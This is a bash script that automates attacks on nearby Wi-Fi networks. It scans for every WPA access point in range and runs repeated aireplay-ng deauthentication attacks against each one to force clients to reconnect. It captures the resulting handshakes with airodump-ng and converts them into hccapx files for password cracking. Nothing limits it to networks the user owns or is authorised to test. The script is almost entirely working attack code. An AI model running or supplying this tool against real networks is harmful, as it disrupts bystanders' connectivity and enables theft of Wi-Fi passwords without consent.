#!/bin/bash
#
# Author & maintainer: Erikas Rudinskas <erikmnkl@gmail.com>

function startServices() {
	if [[ "$MANUALMONITORINGMODE" -ne 1 ]]; then
		echo "Enabling station mode on $INTERFACE..."
		airmon-ng stop $INTERFACE > /dev/null
	fi
	if [[ "$SCRIPTDISABLEDNETWORKMANAGER" -eq 1 ]]; then
		echo "Starting network manager service..."
		systemctl start NetworkManager.service
	fi
	exit 0
}

checkRoot(){
	if [[ "$(id -u)" != "0" ]]; then
	   echo "Sorry, you must run this script as root." 1>&2
	   exit 1
	fi
}

checkDependencies(){
	type aircrack-ng >/dev/null 2>&1 || { echo -e >&2 "'aircrack-ng' package is required but is not installed. Aborting..."; exit 1; }
	type ifconfig >/dev/null 2>&1 || { echo -e >&2 "'net-tools' package is required but is not installed. Aborting..."; exit 1; }
	type xterm >/dev/null 2>&1 || { echo -e >&2 "'xterm' package is required but is not installed. Aborting..."; exit 1; }
	type cap2hccapx >/dev/null 2>&1 || { echo -e >&2 "'hashcat-utils' package is required but is not installed. Aborting..."; exit 1; }
}

stopNetworkManager(){
	read -p "Do you want to stop network manager service? (Y/N) "
	if [[ $REPLY =~ ^[Yy]$ ]]; then # Y or y
		SCRIPTDISABLEDNETWORKMANAGER=1
		echo "Stopping network manager service..."
		systemctl stop NetworkManager.service
	fi
}

selectInterface(){
	clear
	unset options i
	while IFS= read -r -d $'\n' f; do
	  options[i++]="$f"
	done < <(airmon-ng | grep phy | awk -F '[\t ]+' '{ print $2 }')

	echo "Select interface you wish to use:"
	#######################
	select opt in "${options[@]}"; do
		case $opt in
		w*)
			INTERFACE="$opt"
			break
			;;
		*)
			echo "Ummm?"
			;;
		esac
	done

	clear
	echo "Selected interface: $INTERFACE"
	DONE=0; while : ; do read -p "Have you manually/already enabled monitoring mode on $INTERFACE? (Y/N) "
	if [[ $REPLY =~ ^[Yy]$ ]]; then # Y or y
		MANUALMONITORINGMODE=1
		DONE=1
	elif [[ $REPLY =~ ^[Nn]$ ]]; then # N or n
		airmon-ng start $INTERFACE > /dev/null
		clear
		echo "Select interface turned into monitoring mode:"
		#######################
		unset options i
		while IFS= read -r -d $'\n' f; do
		  options[i++]="$f"
		done < <(airmon-ng | grep phy | awk -F '[\t ]+' '{ print $2 }')

		select opt in "${options[@]}"; do
			case $opt in
			w*)
				INTERFACE="$opt"
				break
				;;
			*)
				echo "Ummm?"
				;;
			esac
		done
		#######################
		DONE=1
	else # Anything else
		echo "What?"
		sleep 2
	fi; if [ "$DONE" -ne 0 ]; then break; fi; done
}

############################################################################################
############################################################################################
############################################################################################
############################################################################################
############################################################################################

# Check if script is executed as root:
checkRoot

# Check if required programs are installed:
checkDependencies

# Clear screen:
clear

# Stop NetworkManager
stopNetworkManager

# Show available interfaces menu and option to enable monitoring mode:
selectInterface

# Collect (scan) available APs:
printf "\n ===== Press CTRL+C to stop scanning ===== \n"
sleep 1.5
trap ' ' INT
airodump-ng --ignore-negative-one $INTERFACE 2>&1 | tee OMGDISFILEISSIKH

# On CTRL+C - restore services and station mode on adapter (if was enabled):
trap startServices INT

# Clear screen:
clear

# Remove unnecesarry data whilst moving everything to a new "human friendly" file:
cat OMGDISFILEISSIKH | grep "^\s[0-9A-Z][0-9A-Z]:" | grep WPA | awk -F '[ ]+' '{ print $2 " " $7 }' | sort | uniq > macList.txt

# Remove unneeded file:
rm -f OMGDISFILEISSIKH

# Attempt to get handshake for each row in macList.txt file:
MACCOUNT=`cat macList.txt | wc -l`
TAKESTIME=$(($MACCOUNT * 40))
#-------------------------------
num=$TAKESTIME #time in seconds
min=0
hour=0
day=0
if((num>59));then((sec=num%60));((num=num/60));if((num>59));then((min=num%60));((num=num/60));if((num>23));then((hour=num%24));((day=num/24));else((hour=num));fi;else((min=num));fi;else((sec=num));fi
#-------------------------------
STARTTIME=`date +"%T"`
ENDTIME=`date +"%T" -d "+$TAKESTIME seconds"`
echo "Each scanned and logged AP will be attempted to \"sniff\" for handshake. This will scan each AP using airodump-ng, so ensure that you have as strong signal as possible!"
echo "----------------------------------------------"
echo "Estimated time: $day "days "$hour "hours "$min "minutes "$sec "seconds
echo "Started at: $STARTTIME"
echo "Ends at: $ENDTIME"
echo "----------------------------------------------"
echo

COUNTER=1

while read line; do

	MACADDR=`echo $line | awk '{ print $1 }'`
	CHANNEL=`echo $line | awk '{ print $2 }'`
	# echo "Mac address: $MACADDR; Channel: $CHANNEL"

	printf "($COUNTER/$MACCOUNT) Sniffing $MACADDR..."

	# echo "line: $line"
	# echo "MACADDR: $MACADDR"
	# echo "CHANNEL: $CHANNEL"
	# echo "INTERFACE: $INTERFACE"

	xterm -geometry 93x15+800+100 -fg white -bg black -xrm 'XTerm.vt100.allowTitleOps: false' -T "aireplay-ng clients deauth attack" -e "sleep 5 && aireplay-ng -0 5 -a $MACADDR $INTERFACE && sleep 5 && aireplay-ng -0 5 -a $MACADDR $INTERFACE && sleep 5 && aireplay-ng -0 5 -a $MACADDR $INTERFACE" &
	sleep 1 # gnoem bug - at the same time the second terminal will be practically not visible. Because of 1 sec, I reduce sniffing by 1 second (40 --> 39)
	timeout 39 xterm -geometry 93x15+800+350 -fg white -bg black -xrm 'XTerm.vt100.allowTitleOps: false' -T "airodump-ng sniffing handshake" -e "airodump-ng --bssid $MACADDR -c $CHANNEL -w handshake_$MACADDR $INTERFACE"

	((COUNTER=COUNTER+1))

	echo "DONE"

done < macList.txt
echo

# Convert *.cap files to *.hccapx:
echo "Converting *.cap files to *.hccapx..."
for handshake in handshake_*.cap; do
	FILENAME=${handshake%.*}
	AMOUNTOFHCCAPX=`cap2hccapx "$FILENAME.cap" "$FILENAME.hccapx" | grep Written | grep "WPA Handshakes to: " | awk '{ print $2 }'`
	# If ho handshake was recorded - delete all files
	if [ "$AMOUNTOFHCCAPX" -eq "0" ]; then
		rm -f "$FILENAME".*
	fi
done

# List available HCCAPX files and MACs for whom handshakes were collected + ask to merge handshakes:
HCCAPTEST=`ls handshake*.hccapx 2>/dev/null`
if [[ "$HCCAPTEST" ]]; then
	echo
	echo "The only handshakes that were collected:"
	echo "----------------------------------------------"
	unset options i
	while IFS= read -r -d $'\n' f; do
		options[i++]="$f"
	done < <(ls -1 handshake_*.hccapx 2>/dev/null)
	for opt in "${options[@]}"; do
		a=${opt%-*.hccapx}
		b=${opt#handshake_}
		printf "\t$b\n"
	done
	echo "----------------------------------------------"
	echo
	MACCOUNT=`ls -1 handshake_*.hccapx 2>/dev/null | wc -l`
	if [[ "$MACCOUNT" > 1 ]]; then
		read -p "Do you want single (merged) HCCAPX file for all handshakes? (Y/N) "
		if [[ $REPLY =~ ^[Yy]$ ]]; then
			cat *.hccapx > merged
			rm -f *.hccapx
			mv merged handshakes.hccapx
		fi
	fi
else
	echo "No handshakes found..."
	echo
fi

# Remove generated trash:
rm -f handshake_*.csv
rm -f handshake_*.kismet.netxml
rm -f handshake_*.cap # Not sure if needed, but won't harm if it stays here

read -p "Do you want me to delete macList.txt file (used by script, contains only MACs and their used channels)? (Y/N) "
if [[ $REPLY =~ ^[Yy]$ ]]; then
	rm -f macList.txt
fi

echo
echo "####################"
echo "# Script finished! #"
echo "####################"
echo

# Start services (disable monitoring mode and start NetworkManager.service)
startServices